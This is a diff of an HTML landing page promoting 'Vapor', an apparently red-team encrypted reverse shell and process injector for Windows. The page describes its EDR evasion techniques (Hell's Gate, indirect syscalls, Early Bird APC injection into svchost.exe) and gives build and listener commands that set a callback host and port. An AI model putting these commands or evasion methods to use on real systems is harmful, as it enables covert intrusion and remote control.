+            border-radius: 8px;
+            padding: 28px;
+            transition: all 0.25s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .feature::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--red), var(--maroon));
+            opacity: 0;
+            transition: opacity 0.25s;
+        }
+
+        .feature:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 32px rgba(0, 0, 0, 0.25);
+            border-color: var(--surface2);
+        }
+
+        .feature:hover::before { opacity: 1; }
+
+        .feature h3 {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--red);
+            margin-bottom: 10px;
+            letter-spacing: 0.02em;
+        }
+
+        .feature p { font-size: 13.5px; color: var(--subtext1); line-height: 1.65; }
+
+        /* ── Mode Cards ── */
+        .modes-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+        }
+
+        .mode-card {
+            background: var(--surface0);
+            border: 1px solid var(--surface1);
+            border-radius: 8px;
+            padding: 28px;
+            transition: all 0.25s;
+        }
+
+        .mode-card:hover {
+            transform: translateY(-2px);
+            border-color: var(--surface2);
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
+        }
+
+        .mode-card .mode-icon {
+            font-size: 24px;
+            margin-bottom: 12px;
+            display: block;
+        }
+
+        .mode-card h3 {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--red);
+            margin-bottom: 8px;
+        }
+
+        .mode-card p { font-size: 13px; color: var(--subtext1); line-height: 1.6; margin-bottom: 14px; }
+
+        .mode-card .mode-cmd {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            color: var(--green);
+            background: var(--mantle);
+            padding: 8px 12px;
+            border-radius: 4px;
+            display: block;
+            overflow-x: auto;
+        }
+
+        /* ── Capabilities ── */
+        .capabilities {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(155px, 1fr));
+            gap: 10px;
+        }
+
+        .capability {
+            background: var(--surface0);
+            border: 1px solid var(--surface1);
+            border-radius: 20px;
+            padding: 9px 18px;
+            font-size: 12.5px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.2s;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .capability:hover { border-color: var(--surface2); background: var(--surface1); }
+
+        .cap-dot { width: 7px; height: 7px; border-radius: 50%; flex-shrink: 0; }
+        .cap-dot.full { background: var(--green); }
+        .cap-dot.partial { background: var(--yellow); }
+        .cap-dot.none { background: var(--surface2); }
+
+        /* ── Terminal ── */
+        .terminal {
+            background: var(--mantle);
+            border: 1px solid var(--surface1);
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
+        }
+
+        .terminal-bar {
+            background: var(--crust);
+            padding: 10px 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border-bottom: 1px solid var(--surface0);
+        }
+
+        .terminal-dot { width: 12px; height: 12px; border-radius: 50%; }
+        .terminal-dot:nth-child(1) { background: var(--red); }
+        .terminal-dot:nth-child(2) { background: var(--yellow); }
+        .terminal-dot:nth-child(3) { background: var(--green); }
+        .terminal-label { flex: 1; text-align: center; font-size: 11px; color: var(--overlay0); font-family: 'JetBrains Mono', monospace; }
+
+        .terminal-body {
+            padding: 24px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            line-height: 1.8;
+        }
+
+        .terminal-body pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; }
+        .terminal-body .p { color: var(--green); }
+        .terminal-body .c { color: var(--overlay0); }
+        .terminal-body .v { color: var(--sapphire); }
+        .terminal-body .f { color: var(--peach); }
+        .terminal-body .cursor {
+            display: inline-block;
+            width: 8px; height: 15px;
+            background: var(--text);
+            animation: blink 1s step-end infinite;
+            vertical-align: middle;
+        }
+
+        @keyframes blink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0; } }
+
+        /* ── Architecture ── */
+        .arch-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 20px;
+        }
+
+        .arch-card {
+            background: var(--surface0);
+            border: 1px solid var(--surface1);
+            border-radius: 8px;
+            padding: 28px;
+            transition: border-color 0.2s;
+        }
+
+        .arch-card:hover { border-color: var(--surface2); }
+
+        .arch-num {
+            display: inline-flex;
+            width: 30px; height: 30px;
+            background: linear-gradient(135deg, var(--red), var(--maroon));
+            color: var(--crust);
+            border-radius: 50%;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 14px;
+            margin-bottom: 14px;
+        }
+
+        .arch-card h3 {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--maroon);
+            margin-bottom: 10px;
+        }
+
+        .arch-card p { font-size: 13.5px; color: var(--subtext1); line-height: 1.6; }
+
+        /* ── Two Column ── */
+        .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 28px; align-items: start; }
+
+        /* ── Detection ── */
+        .detect-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 32px; }
+
+        .detect-card {
+            background: var(--surface0);
+            border-radius: 8px;
+            padding: 28px;
+        }
+
+        .detect-card h3 {
+            font-size: 15px;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .detect-card ul {
+            list-style: none;
+            font-size: 13px;
+            color: var(--subtext1);
+            line-height: 2;
+        }
+
+        .detect-card ul li::before { margin-right: 8px; }
+
+        .detect-hidden { border-left: 3px solid var(--green); }
+        .detect-hidden h3 { color: var(--green); }
+        .detect-visible { border-left: 3px solid var(--yellow); }
+        .detect-visible h3 { color: var(--yellow); }
+
+        /* ── Footer ── */
+        footer {
+            border-top: 1px solid var(--surface1);
+            padding: 48px 0;
+            margin-top: 80px;
+        }
+
+        .footer-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 32px;
+        }
+
+        .footer-grid h4 {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            color: var(--text);
+            margin-bottom: 14px;
+            letter-spacing: 0.05em;
+            text-transform: uppercase;
+        }
+
+        .footer-grid ul { list-style: none; }
+        .footer-grid li { margin-bottom: 8px; }
+        .footer-grid a { color: var(--overlay2); text-decoration: none; font-size: 13px; transition: color 0.2s; }
+        .footer-grid a:hover { color: var(--red); }
+
+        .footer-grid p { font-size: 13px; color: var(--overlay1); line-height: 1.7; }
+
+        .footer-bottom {
+            text-align: center;
+            margin-top: 36px;
+            padding-top: 24px;
+            border-top: 1px solid var(--surface0);
+            font-size: 12px;
+            color: var(--overlay0);
+            letter-spacing: 0.02em;
+        }
+
+        /* ── Responsive ── */
+        @media (max-width: 960px) {
+            .stats { grid-template-columns: repeat(3, 1fr); }
+            .modes-grid, .two-col, .arch-grid, .detect-grid { grid-template-columns: 1fr; }
+            .footer-grid { grid-template-columns: repeat(2, 1fr); }
+        }
+
+        @media (max-width: 600px) {
+            .container { padding: 0 16px; }
+            .hero { padding: 60px 0 48px; }
+            section { padding: 48px 0; }
+            .stats { grid-template-columns: repeat(2, 1fr); }
+            .cta-group { flex-direction: column; align-items: center; }
+            .btn { width: 100%; max-width: 280px; text-align: center; }
+            .features { grid-template-columns: 1fr; }
+            .footer-grid { grid-template-columns: 1fr; }
+        }
+
+        a:focus-visible { outline: 2px solid var(--red); outline-offset: 2px; }
+    </style>
 </head>
 <body>
 
-<div class="page-wrap">
-
-  <!-- ============ HERO ============ -->
-  <section class="hero" id="top">
-    <div class="hero-terminal">
-      <div class="hero-titlebar">
-        <span class="hero-dot hero-dot--red"></span>
-        <span class="hero-dot hero-dot--yellow"></span>
-        <span class="hero-dot hero-dot--green"></span>
-        <span class="hero-titlebar-text">vapor &mdash;&mdash; encrypted reverse shell</span>
-      </div>
-      <div class="hero-body">
-        <h1 class="hero-title">Vapor<span class="hero-cursor" aria-hidden="true"></span></h1>
-        <p class="hero-tagline">
-          ChaCha20-Poly1305 encrypted reverse shell in pure x86_64 assembly.<br>
-          <em>~3.6 KB shellcode. Hell's Gate injector. Zero imports. Full AEAD.</em>
-        </p>
-        <div class="hero-stats">
-          <div class="hero-stat">
-            <div class="hero-stat-value">~3.6 KB</div>
-            <div class="hero-stat-label">Shellcode Size</div>
-          </div>
-          <div class="hero-stat">
-            <div class="hero-stat-value">256-bit</div>
-            <div class="hero-stat-label">PSK Encryption</div>
-          </div>
-          <div class="hero-stat">
-            <div class="hero-stat-value">RFC 8439</div>
-            <div class="hero-stat-label">AEAD Standard</div>
-          </div>
-          <div class="hero-stat">
-            <div class="hero-stat-value">Indirect</div>
-            <div class="hero-stat-label">Syscalls</div>
-          </div>
-        </div>
-        <div class="hero-buttons">
-          <a href="https://github.com/Real-Fruit-Snacks/Vapor" class="btn btn-primary">View Source</a>
-          <a href="#architecture" class="btn btn-ghost">Read Docs</a>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- ============ FEATURES ============ -->
-  <section id="features">
-    <span class="section-label">// capabilities</span>
-    <h2 class="section-title">Pure assembly. Fully encrypted.</h2>
-    <p class="section-desc">
-      Every byte handcrafted in NASM. No compiler, no runtime, no import table. ChaCha20-Poly1305 AEAD and Hell's Gate injection &mdash; all from scratch in position-independent shellcode.
-    </p>
-
-    <div class="features-grid">
-      <div class="feature-card">
-        <span class="feature-icon" aria-hidden="true">&#128274;</span>
-        <h3>ChaCha20-Poly1305</h3>
-        <p>Full RFC 8439 AEAD in pure assembly. 256-bit PSK, fresh random nonce per message, Poly1305 MAC verification rejects tampered payloads.</p>
-      </div>
-
-      <div class="feature-card">
-        <span class="feature-icon" aria-hidden="true">&#129518;</span>
-        <h3>~3.6 KB PIC Shellcode</h3>
-        <p>API resolution, networking, crypto, command execution &mdash; all in ~3,600 bytes of position-independent code. No compiler, no runtime.</p>
-      </div>
-
-      <div class="feature-card">
-        <span class="feature-icon" aria-hidden="true">&#128269;</span>
-        <h3>PEB Walk + Hash Lookup</h3>
-        <p>APIs resolved at runtime via PEB walking and ror13 hash matching. GetProcAddress handles forwarded exports. No import table.</p>
-      </div>
-
-      <div class="feature-card">
-        <span class="feature-icon" aria-hidden="true">&#128260;</span>
-        <h3>Piped Execution</h3>
-        <p>Commands run via CreateProcessA with cmd.exe /c, stdout+stderr captured through anonymous pipes. PeekNamedPipe polling streams output in real-time with a 30-second timeout.</p>
-      </div>
-
-      <div class="feature-card">
-        <span class="feature-icon" aria-hidden="true">&#128190;</span>
-        <h3>Dual Output</h3>
-        <p>Builds as raw PIC shellcode (vapor.bin) for injection and minimal PE (vapor.exe) for direct execution. Same source, two formats.</p>
-      </div>
-
-      <div class="feature-card">
-        <span class="feature-icon" aria-hidden="true">&#127758;</span>
-        <h3>Encrypted Listener</h3>
-        <p>Python 3 listener with ChaCha20-Poly1305 encryption, interactive CLI, spinner for long-running commands, and Catppuccin Mocha themed output.</p>
-      </div>
-
-      <div class="feature-card">
-        <span class="feature-icon" aria-hidden="true">&#128293;</span>
-        <h3>Hell's Gate + Indirect Syscalls</h3>
-        <p>SSNs extracted at runtime from ntdll stubs with Halo's Gate fallback for hooked stubs. All NT syscalls jump to ntdll's own syscall gadget &mdash; return address traces to ntdll, not the injector.</p>
-      </div>
-
-      <div class="feature-card">
-        <span class="feature-icon" aria-hidden="true">&#128163;</span>
-        <h3>Early Bird APC Injection</h3>
-        <p>Target created suspended, shellcode written via NT syscalls (RW&rarr;RX), APC queued to main thread. Fires before process entry point &mdash; before EDR userland hooks initialize.</p>
-      </div>
-    </div>
-  </section>
-
-  <!-- ============ ARCHITECTURE ============ -->
-  <section id="architecture">
-    <span class="section-label">// architecture</span>
-    <h2 class="section-title">Wire protocol &amp; data flow.</h2>
-    <p class="section-desc">
-      Every message is independently encrypted with a fresh 96-bit nonce. The Poly1305 MAC authenticates the ciphertext per RFC 8439 &mdash; any tampered byte is rejected before execution.
-    </p>
-
-    <div class="arch-terminal">
-      <div class="arch-titlebar">
-        <span class="hero-dot hero-dot--red"></span>
-        <span class="hero-dot hero-dot--yellow"></span>
-        <span class="hero-dot hero-dot--green"></span>
-        <span class="arch-titlebar-text">vapor &mdash;&mdash; wire protocol</span>
-      </div>
-      <div class="arch-body">
-        <div class="flow-diagram">
-          <div class="flow-node">
-            <div class="flow-node-box">vapor.exe</div>
-            <div class="flow-node-label">Target</div>
-          </div>
-          <div class="flow-arrows">
-            <div class="flow-arrow">
-              <div class="flow-arrow-line"></div>
-              <span class="flow-arrow-tag flow-arrow-tag--tcp">raw TCP</span>
+    <!-- ════════════════════ HERO ════════════════════ -->
+    <section class="hero">
+        <div class="container">
+            <div class="hero-logo">
+                <img src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Vapor/main/docs/assets/logo-dark.svg" alt="Vapor">
             </div>
-            <div class="flow-arrow flow-arrow--left">
-              <span class="flow-arrow-tag flow-arrow-tag--enc">encrypted cmd</span>
-              <div class="flow-arrow-line"></div>
+
+            <p class="subtitle">
+                ChaCha20-Poly1305 encrypted reverse shell and process injector in pure x86_64 NASM assembly.
+                ~3.6 KB position-independent shellcode. Hell's Gate syscalls. Zero dependencies.
+            </p>
+
+            <div class="warning">
+                <strong>Authorization Required:</strong> Designed exclusively for authorized security testing with explicit written permission.
             </div>
-            <div class="flow-arrow">
-              <div class="flow-arrow-line"></div>
-              <span class="flow-arrow-tag flow-arrow-tag--enc">encrypted out</span>
+
+            <div class="stats">
+                <div class="stat">
+                    <div class="stat-value">~3.6KB</div>
+                    <div class="stat-label">Shellcode Size</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-value">256</div>
+                    <div class="stat-label">Bit PSK</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-value">0</div>
+                    <div class="stat-label">Dependencies</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-value">5</div>
+                    <div class="stat-label">NT Syscalls</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-value">2</div>
+                    <div class="stat-label">Output Formats</div>
+                </div>
             </div>
-          </div>
-          <div class="flow-node">
-            <div class="flow-node-box">listener.py</div>
-            <div class="flow-node-label">Operator</div>
-          </div>
+
+            <div class="cta-group">
+                <a href="https://github.com/Real-Fruit-Snacks/Vapor/releases/latest" class="btn btn-primary">Download Latest</a>
+                <a href="https://github.com/Real-Fruit-Snacks/Vapor" class="btn btn-secondary">View Source</a>
+                <a href="https://github.com/Real-Fruit-Snacks/Vapor#quick-start" class="btn btn-ghost">Documentation</a>
+            </div>
         </div>
+    </section>
 
-        <hr class="arch-divider">
+    <!-- ════════════════════ COMPONENTS ════════════════════ -->
+    <section>
+        <div class="container">
+            <h2>Components</h2>
+            <p class="section-desc">Three components covering the full kill chain: implant generation, process injection, and operator control.</p>
 
-        <div class="wire-bar-label">Wire Format (per message)</div>
-        <div class="wire-bar">
-          <div class="wire-segment wire-seg--len">
-            <span class="wire-segment-name">len</span>
-            <span class="wire-segment-detail">4B &middot; LE u32</span>
-          </div>
-          <div class="wire-segment wire-seg--nonce">
-            <span class="wire-segment-name">nonce</span>
-            <span class="wire-segment-detail">12B &middot; random</span>
-          </div>
-          <div class="wire-segment wire-seg--ct">
-            <span class="wire-segment-name">ciphertext</span>
-            <span class="wire-segment-detail">N bytes &middot; ChaCha20</span>
-          </div>
-          <div class="wire-segment wire-seg--mac">
-            <span class="wire-segment-name">mac</span>
-            <span class="wire-segment-detail">16B &middot; Poly1305</span>
-          </div>
+            <div class="modes-grid">
+                <div class="mode-card">
+                    <span class="mode-icon">&#9889;</span>
+                    <h3>Implant</h3>
+                    <p>Position-independent shellcode with full ChaCha20-Poly1305 AEAD. PEB-resolved APIs, piped command execution, random nonces.</p>
+                    <code class="mode-cmd">make LHOST=10.10.14.1 LPORT=443 all</code>
+                </div>
+
+                <div class="mode-card">
+                    <span class="mode-icon">&#128274;</span>
+                    <h3>Injector</h3>
+                    <p>Hell's Gate + Halo's Gate SSN extraction. Indirect syscalls via ntdll gadget. Early Bird APC injection into suspended processes.</p>
+                    <code class="mode-cmd">make TARGET="svchost.exe" all</code>
+                </div>
+
+                <div class="mode-card">
+                    <span class="mode-icon">&#128424;</span>
+                    <h3>Listener</h3>
+                    <p>Python 3 interactive CLI with matching ChaCha20-Poly1305 decryption. Catppuccin Mocha themed output. PSK-based authentication.</p>
+                    <code class="mode-cmd">python3 listener.py --lport 443 --key &lt;psk&gt;</code>
+                </div>
+            </div>
         </div>
-      </div>
-    </div>
-  </section>
+    </section>
 
-  <!-- ============ INJECTOR ============ -->
-  <section id="injector">
-    <span class="section-label">// injector</span>
-    <h2 class="section-title">Hell's Gate process injection.</h2>
-    <p class="section-desc">
-      Deploy vapor.bin into a target process using direct NT syscalls. No high-level API calls for EDR to hook &mdash; SSNs extracted at runtime, syscalls routed through ntdll's own gadget.
-    </p>
+    <!-- ════════════════════ FEATURES ════════════════════ -->
+    <section style="background: var(--mantle);">
+        <div class="container">
+            <h2>Technical Features</h2>
+            <p class="section-desc">Every component built from scratch in x86_64 NASM assembly. No compiler, no runtime, no abstractions.</p>
 
-    <div class="injector-flow">
-      <div class="injector-titlebar">
-        <span class="hero-dot hero-dot--red"></span>
-        <span class="hero-dot hero-dot--yellow"></span>
-        <span class="hero-dot hero-dot--green"></span>
-        <span class="injector-titlebar-text">injector.exe &mdash;&mdash; injection flow</span>
-      </div>
-      <div class="injector-body">
-        <div class="injector-steps">
-          <div class="injector-step">
-            <span class="step-num">1</span>
-            <div class="step-content"><strong>PEB Walk</strong><br>Find <span class="k32-fn">ntdll.dll</span> + <span class="k32-fn">kernel32.dll</span> via module hash</div>
-          </div>
-          <div class="injector-step">
-            <span class="step-num">2</span>
-            <div class="step-content"><strong>Hell's Gate</strong><br>Extract SSNs from ntdll stubs (<code>4C 8B D1 B8</code> pattern)</div>
-          </div>
-          <div class="injector-step">
-            <span class="step-num">3</span>
-            <div class="step-content"><strong>Find Gadget</strong><br>Scan ntdll for <code>syscall; ret</code> (<code>0F 05 C3</code>)</div>
-          </div>
-          <div class="injector-step">
-            <span class="step-num">4</span>
-            <div class="step-content"><strong>Create Suspended</strong><br><span class="k32-fn">CreateProcessA</span> with CREATE_SUSPENDED</div>
-          </div>
-          <div class="injector-step">
-            <span class="step-num">5</span>
-            <div class="step-content"><strong>Allocate RW</strong><br><span class="nt-fn">NtAllocateVirtualMemory</span> in target</div>
-          </div>
-          <div class="injector-step">
-            <span class="step-num">6</span>
-            <div class="step-content"><strong>Write Shellcode</strong><br><span class="nt-fn">NtWriteVirtualMemory</span> &rarr; vapor.bin</div>
-          </div>
-          <div class="injector-step">
-            <span class="step-num">7</span>
-            <div class="step-content"><strong>Protect RX</strong><br><span class="nt-fn">NtProtectVirtualMemory</span> RW &rarr; RX</div>
-          </div>
-          <div class="injector-step">
-            <span class="step-num">8</span>
-            <div class="step-content"><strong>Queue + Resume</strong><br><span class="nt-fn">NtQueueApcThread</span> + <span class="nt-fn">NtResumeThread</span></div>
-          </div>
+            <div class="features">
+                <div class="feature">
+                    <h3>ChaCha20-Poly1305</h3>
+                    <p>Full RFC 8439 AEAD in pure assembly. 256-bit PSK, 12-byte random nonce per message, Poly1305 MAC with mod 2^130-5 arithmetic.</p>
+                </div>
+                <div class="feature">
+                    <h3>PEB Walk</h3>
+                    <p>All Windows APIs resolved via <code>gs:[0x60]</code> PEB walking and ror13 hash matching. Zero imports, zero API name strings.</p>
+                </div>
+                <div class="feature">
+                    <h3>Hell's Gate</h3>
+                    <p>Syscall numbers extracted from ntdll stub opcodes at runtime. Halo's Gate fallback scans neighbor stubs when hooks are detected.</p>
+                </div>
+                <div class="feature">
+                    <h3>Indirect Syscalls</h3>
+                    <p>All NT syscalls jump to a <code>syscall; ret</code> gadget found in ntdll's .text section. Return address traces back to ntdll, not the injector.</p>
+                </div>
+                <div class="feature">
+                    <h3>Early Bird APC</h3>
+                    <p>Target created suspended. Shellcode written via NT syscalls (RW to RX). APC queued to main thread &mdash; fires before EDR userland hooks.</p>
+                </div>
+                <div class="feature">
+                    <h3>Position-Independent</h3>
+                    <p>Entire implant is PIC shellcode. No relocations, no fixed addresses. Inject into any process at any base address.</p>
+                </div>
+                <div class="feature">
+                    <h3>Dual Output</h3>
+                    <p>Same source builds as raw shellcode (<code>vapor.bin</code>) for injection and minimal PE (<code>vapor.exe</code>) for direct execution.</p>
+                </div>
+                <div class="feature">
+                    <h3>Piped Execution</h3>
+                    <p><code>CreateProcessA</code> with <code>cmd.exe /c</code>, anonymous pipe capture of stdout+stderr, PeekNamedPipe polling with 30s timeout.</p>
+                </div>
+                <div class="feature">
+                    <h3>Build Script</h3>
+                    <p>One command generates a random 256-bit PSK, assembles implant + injector, and prints the exact listener command to run.</p>
+                </div>
+            </div>
         </div>
+    </section>
 
-        <hr class="arch-divider">
+    <!-- ════════════════════ CAPABILITIES ════════════════════ -->
+    <section>
+        <div class="container">
+            <h2>Capabilities</h2>
+            <p class="section-desc">Pure assembly implementation targeting Windows x86_64. Every capability built without external dependencies.</p>
 
-        <div class="injector-techniques">
-          <div class="technique-pill"><span class="t-dot"></span> Hell's Gate SSN Extraction</div>
-          <div class="technique-pill"><span class="t-dot"></span> Halo's Gate Fallback</div>
-          <div class="technique-pill"><span class="t-dot"></span> Indirect Syscall Gadget</div>
-          <div class="technique-pill"><span class="t-dot"></span> Early Bird APC Injection</div>
-          <div class="technique-pill"><span class="t-dot"></span> RW &rarr; RX Memory Protection</div>
-          <div class="technique-pill"><span class="t-dot"></span> Configurable Target Process</div>
+            <div class="capabilities">
+                <div class="capability"><span class="cap-dot full"></span>ChaCha20-Poly1305</div>
+                <div class="capability"><span class="cap-dot full"></span>PEB API Resolution</div>
+                <div class="capability"><span class="cap-dot full"></span>ror13 Hash Lookup</div>
+                <div class="capability"><span class="cap-dot full"></span>Random Nonces</div>
+                <div class="capability"><span class="cap-dot full"></span>Piped Execution</div>
+                <div class="capability"><span class="cap-dot full"></span>Shellcode Output</div>
+                <div class="capability"><span class="cap-dot full"></span>PE Output</div>
+                <div class="capability"><span class="cap-dot full"></span>Hell's Gate SSN</div>
+                <div class="capability"><span class="cap-dot full"></span>Halo's Gate</div>
+                <div class="capability"><span class="cap-dot full"></span>Indirect Syscalls</div>
+                <div class="capability"><span class="cap-dot full"></span>Early Bird APC</div>
+                <div class="capability"><span class="cap-dot full"></span>Build-time Target</div>
+                <div class="capability"><span class="cap-dot partial"></span>Reconnect</div>
+                <div class="capability"><span class="cap-dot none"></span>File Transfer</div>
+                <div class="capability"><span class="cap-dot none"></span>Anti-Debug</div>
+                <div class="capability"><span class="cap-dot none"></span>Staged Delivery</div>
+            </div>
+
+            <div style="margin-top: 20px; font-size: 12px; color: var(--overlay0); font-family: 'JetBrains Mono', monospace;">
+                <span style="color: var(--green);">&#9679;</span> Implemented &nbsp;&nbsp;
+                <span style="color: var(--yellow);">&#9679;</span> Planned &nbsp;&nbsp;
+                <span style="color: var(--surface2);">&#9679;</span> Future
+            </div>
         </div>
-      </div>
-    </div>
-  </section>
+    </section>
 
-  <!-- ============ INTERNALS ============ -->
-  <section class="capabilities-section" id="internals">
-    <span class="section-label">// internals</span>
-    <h2 class="section-title">Every component from scratch.</h2>
-    <p class="section-desc" style="margin-left:auto;margin-right:auto;">
-      What makes Vapor tick &mdash; every component implemented from scratch in assembly.
-    </p>
+    <!-- ════════════════════ DETECTION ════════════════════ -->
+    <section style="background: var(--mantle);">
+        <div class="container">
+            <h2>Detection Awareness</h2>
+            <p class="section-desc">Know what Vapor evades and what it doesn't. Honest tooling for professional operators.</p>
 
-    <div class="capabilities-terminal">
-      <div class="capabilities-titlebar">
-        <span class="hero-dot hero-dot--red"></span>
-        <span class="hero-dot hero-dot--yellow"></span>
-        <span class="hero-dot hero-dot--green"></span>
-        <span class="capabilities-titlebar-text">vapor &mdash;&mdash; component map</span>
-      </div>
-      <div class="capabilities-body">
-        <div class="capabilities-grid">
-          <div class="capability-pill"><span class="dot dot--api"></span> PEB Walking</div>
-          <div class="capability-pill"><span class="dot dot--api"></span> ror13 Hash Resolution</div>
-          <div class="capability-pill"><span class="dot dot--api"></span> GetProcAddress Fallback</div>
-          <div class="capability-pill"><span class="dot dot--net"></span> WSASocketA + Connect</div>
-          <div class="capability-pill"><span class="dot dot--net"></span> recv_exact / send_all</div>
-          <div class="capability-pill"><span class="dot dot--chacha"></span> ChaCha20 Quarter-Round</div>
-          <div class="capability-pill"><span class="dot dot--chacha"></span> ChaCha20 Block Cipher</div>
-          <div class="capability-pill"><span class="dot dot--chacha"></span> ChaCha20 Stream XOR</div>
-          <div class="capability-pill"><span class="dot dot--aead"></span> Poly1305 MAC (mod 2&#x00B9;&#x00B3;&#x2070;&#x207B;&#x2075;)</div>
-          <div class="capability-pill"><span class="dot dot--aead"></span> AEAD Encrypt</div>
-          <div class="capability-pill"><span class="dot dot--aead"></span> AEAD Decrypt + Verify</div>
-          <div class="capability-pill"><span class="dot dot--exec"></span> SystemFunction036 Nonce</div>
-          <div class="capability-pill"><span class="dot dot--exec"></span> CreateProcessA Pipes</div>
-          <div class="capability-pill"><span class="dot dot--exec"></span> PeekNamedPipe Polling</div>
-          <div class="capability-pill"><span class="dot dot--exec"></span> Stack Guard Page Probing</div>
-          <div class="capability-pill"><span class="dot dot--inject"></span> Hell's Gate SSN Extract</div>
-          <div class="capability-pill"><span class="dot dot--inject"></span> Halo's Gate Fallback</div>
-          <div class="capability-pill"><span class="dot dot--inject"></span> Indirect Syscall Gadget</div>
-          <div class="capability-pill"><span class="dot dot--inject"></span> Early Bird APC Injection</div>
-          <div class="capability-pill"><span class="dot dot--inject"></span> RW &rarr; RX Protection</div>
+            <div class="detect-grid">
+                <div class="detect-card detect-hidden">
+                    <h3>Evades</h3>
+                    <ul>
+                        <li>User-mode API hooking &mdash; indirect syscalls bypass hooks</li>
+                        <li>Import table analysis &mdash; zero imports, PEB-resolved</li>
+                        <li>Static signature scanning &mdash; no API strings in binary</li>
+                        <li>Early EDR initialization &mdash; APC fires before entry point</li>
+                        <li>Network content inspection &mdash; ChaCha20-Poly1305 AEAD</li>
+                    </ul>
+                </div>
+                <div class="detect-card detect-visible">
+                    <h3>Visible To</h3>
+                    <ul>
+                        <li>ETW / kernel callbacks &mdash; syscall tracing</li>
+                        <li>Network metadata &mdash; raw TCP connection visible</li>
+                        <li>Kernel-mode EDR &mdash; behavioral analysis</li>
+                        <li>Memory forensics &mdash; shellcode in process memory</li>
+                        <li>AMSI &mdash; script-based detection (if applicable)</li>
+                    </ul>
+                </div>
+            </div>
         </div>
-        <div class="capabilities-legend">
-          <span><span class="dot dot--api" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> API Resolution</span>
-          <span><span class="dot dot--net" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> Networking</span>
-          <span><span class="dot dot--chacha" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> ChaCha20</span>
-          <span><span class="dot dot--aead" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> AEAD</span>
-          <span><span class="dot dot--exec" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> Execution</span>
-          <span><span class="dot dot--inject" style="display:inline-block;width:6px;height:6px;border-radius:50%;"></span> Injection</span>
+    </section>
+
+    <!-- ════════════════════ ARCHITECTURE ════════════════════ -->
+    <section>
+        <div class="container">
+            <h2>Architecture</h2>
+            <p class="section-desc">Four-layer design. API resolution feeds crypto and networking. Injector operates via direct NT syscalls.</p>
+
+            <div class="arch-grid">
+                <div class="arch-card">
+                    <div class="arch-num">1</div>
+                    <h3>API Resolution</h3>
+                    <p>PEB walk via <code>gs:[0x60]</code> to <code>InMemoryOrderModuleList</code>. Export table traversal with ror13 hash matching. <code>GetProcAddress</code> for forwarded exports.</p>
+                </div>
+                <div class="arch-card">
+                    <div class="arch-num">2</div>
+                    <h3>Crypto Engine</h3>
+                    <p>ChaCha20 quarter-round in registers, 20 rounds per block. Poly1305 MAC with full mod 2^130-5 arithmetic. AEAD per RFC 8439 Section 2.8.</p>
+                </div>
+                <div class="arch-card">
+                    <div class="arch-num">3</div>
+                    <h3>Transport</h3>
+                    <p>Raw TCP via <code>WSASocketA</code> / <code>connect</code>. Wire format: <code>[len(4)][nonce(12)][ciphertext][mac(16)]</code>. Random nonces via RtlGenRandom.</p>
+                </div>
+                <div class="arch-card">
+                    <div class="arch-num">4</div>
+                    <h3>Injection Engine</h3>
+                    <p>Hell's Gate SSN extraction from ntdll stubs. Indirect syscall gadget discovery. <code>NtAllocateVirtualMemory</code> &rarr; <code>NtWriteVirtualMemory</code> &rarr; <code>NtProtectVirtualMemory</code> &rarr; <code>NtQueueApcThread</code> &rarr; <code>NtResumeThread</code>.</p>
+                </div>
+            </div>
         </div>
-      </div>
-    </div>
-  </section>
+    </section>
 
-  <!-- ============ QUICK START ============ -->
-  <section id="quick-start">
-    <span class="section-label">// quick start</span>
-    <h2 class="section-title">Build and deploy.</h2>
-    <p class="section-desc">
-      Provide an LHOST, LPORT, and a 256-bit pre-shared key. The build produces shellcode, PE, and injector outputs.
-    </p>
+    <!-- ════════════════════ GETTING STARTED ════════════════════ -->
+    <section style="background: var(--mantle);">
+        <div class="container">
+            <h2>Getting Started</h2>
+            <p class="section-desc">Build from source with NASM and MinGW-w64. One command generates everything.</p>
 
-    <div class="start-terminal">
-      <div class="start-titlebar">
-        <span class="hero-dot hero-dot--red"></span>
-        <span class="hero-dot hero-dot--yellow"></span>
-        <span class="hero-dot hero-dot--green"></span>
-        <span class="start-titlebar-text">bash &mdash;&mdash; build &amp; deploy</span>
-      </div>
-      <div class="start-body">
